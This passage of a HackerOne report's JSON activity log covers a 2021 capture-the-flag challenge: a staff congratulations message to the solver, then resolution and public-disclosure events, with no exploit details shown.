9F9IM60UMxLQOryXEfjuntP3dUV7N7RrtBsV51WdpPI5qRxkV0Z%2BcIpmGHgBv4JDs0ca5GPVlgXveYl6Tubolrjgl%2F0sIneMlQksL6HPcm2wYyAEsiS5MqJOS4aTgc%2FnJjgfG%2F6e4EKWQXZkYwZwRfa1cziT69E%2BX22x0CuAKTmKUE3VgBfns2f5ENHCZ6%2Fhl5yMbhouROHOrlN7IEn5RONLz%2B4eZDmfGhJ%2FpvkQmRp1tbTz7HfzqvuUdDwZeiAP%2BRWzSjP7SXLj4mao0etZeMHx5vdEj84SShunU9hcMS8tgX5Fw45bpY5AbQCBi8odLEkCwbRWbJaP72DzoIMUALMa8dmY5P%2BpdGMBCbphZduj%2BylmeaUZbmOz%2FG8pgLZH3ChO5%2B56%2FgDsTCfwrO9RT7PM9x2WTXp%2FnETG4oQ%2FD3OMK1Yuw4YlsndoVJzZJeglKRg7GNboDe1eruzByQ2eVyI5pdHJKA5WhjWkTWHw%2FEXaRwtrcKu66S%2FqMYw8M2QiwY6pAHeVhNpwCYgPqmuk0nTL4FSGeTL%2BY5%2BRrbnvKUL33KjtItwHOCszdpzGZHXkfO6ovswsDo48jZjNY%2B2mk63Q5oPMs6M2%2FWrAD85A2fyq9MjQDTu5roFF6cvm3fDiFVbWSiSCdiyYnoYOkW1ACCZ%2F%2FozSOvaJw8M4MdPo%2B%2Fm3w%2BV7fQekcCxpJFZSio2SK%2BZNki2DvhUxtoc6TgmaqyF9mCRrZN3qA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c3fd0a1bc86c7c4237c62aecdaa70e131e3979be6b3c5466a0af83c4338faa9e"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10268996,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello!\n\nHappy new year and congratulations on being one of the first 10 hackers to solve the 12 Days of Hacky Holidays! If you'd like to receive a HackerOne care package, please email your full name, address, email address and phone number to ██████████@hackerone.com \n\nThanks,\nBen","automated_response":false,"created_at":"2021-01-04T22:34:30.668Z","updated_at":"2021-01-11T21:25:30.432Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10299649,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-01-07T21:34:51.660Z","updated_at":"2021-01-07T21:34:51.660Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"rekter0","url":"/rekter0"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10345972,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-12T22:46:38.822Z","updated_at":"2021-01-12T22:46:38.822Z","first_to_agree":true,"actor":{"username":"rekter0","cleared":false,"url":"/rekter0","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pwypd9b4i37WWTYyGRpT3Ubo/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10346016,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-12T22:51:10.349Z","updated_at":"2021-01-12T22:51:10.349Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10346017,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-12T22:51:10.463Z","updated_at":"2021-01-12T22:51:10.463Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}